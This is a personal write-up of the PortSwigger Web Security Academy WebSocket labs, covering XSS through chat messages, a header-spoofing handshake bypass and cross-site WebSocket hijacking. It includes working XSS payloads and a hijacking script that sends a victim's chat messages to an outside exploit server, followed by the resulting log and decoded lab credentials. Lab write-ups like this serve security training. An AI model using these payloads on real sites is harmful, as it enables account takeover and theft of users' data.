---
date: 2025-02-07
linktitle: web_sockets
title: Web Sockets Attacks
showreadingtime: true
tags: ['PortSwigger']
categories: ['PortSwigger', 'Server-side']
---

# WebSockets

WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.
![image](/assets/img/portswigger/Pasted image 20250202190629.png)
## Determine the WebSocket messages
You can determine that WebSockets are being used by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.
>Note:
You can configure whether client-to-server or server-to-client messages are intercepted in Burp Proxy. Do this in the Settings dialog, in the WebSocket interception rules settings.

## Manipulating WebSocket connections

As well as manipulating WebSocket messages, it is sometimes necessary to manipulate the WebSocket handshake that establishes the connection.

There are various situations in which manipulating the WebSocket handshake might be necessary:

- It can enable you to reach more attack surface.
- Some attacks might cause your connection to drop so you need to establish a new one.
- Tokens or other data in the original handshake request might be stale and need updating.

You can manipulate the WebSocket handshake using Burp Repeater:

- Send a WebSocket message to Burp Repeater as already described.
- In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.
- If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.
- When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater.

## WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:

- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

## Manipulating WebSocket messages to exploit vulnerabilities

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

`{"message":"Hello Carlos"}`

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

`<td>Hello Carlos</td>`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

`{"message":"<img src=1 onerror='alert(1)'>"}`

Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:
- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

### Lab 1: Manipulating WebSocket messages to exploit vulnerabilities
```
{"message":"<img src=1 onerror='alert(1)'>"}
```

### Lab 2: Manipulating the WebSocket handshake to exploit vulnerabilities
```
Add a parameter `X-Forwarded-For: 1.1.1.1` in the clone request
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

## Using cross-site WebSockets to exploit vulnerabilities

### What is cross-site WebSocket hijacking?

Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

### What is the impact of cross-site WebSocket hijacking?

A successful cross-site WebSocket hijacking attack will often enable an attacker to:

- **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

### Performing a cross-site WebSocket hijacking attack

Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

> Note
The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:

- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.

### Lab: Cross-site WebSocket hijacking
> Referred the solution. As the need of exploit server is unknown. 
```
1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:
    
    `<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by Burp Collaborator.
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.
```

>**Used script**
```
<script>
    var ws = new WebSocket("wss://0aad006503ea07ab80bb2b2000da007c.web-security-academy.net/chat");
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch("https://exploit-0ae8009e0357072b80612a3a01a00019.exploit-server.net/exploit?message=" + btoa(event.data));
    };
</script>
```

![image](/assets/img/portswigger/WhatsApp Image 2025-02-07 at 20.02.44.jpeg)

```
10.0.3.7        2025-02-07 14:31:57 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200 "user-agent: Chrome/859428"
10.0.3.7        2025-02-07 14:31:57 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200 "user-agent: Chrome/859428"
10.0.3.7        2025-02-07 14:31:57 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3Mgdnk2bHdpY3dqOHppbzc2Y21tY2IifQ== HTTP/1.1" 200 "user-agent: Chrome/859428"
10.0.3.7        2025-02-07 14:31:57 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9 HTTP/1.1" 200 "user-agent: Chrome/859428"
10.0.3.7        2025-02-07 14:31:57 +0000 "GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Chrome/859428"
```

>Decoding the base64 requests
>{"user":"Hal Pline","content":"No problem carlos, it's vy6lwicwj8zio76cmmcb"}
`carlos`: `vy6lwicwj8zio76cmmcb`
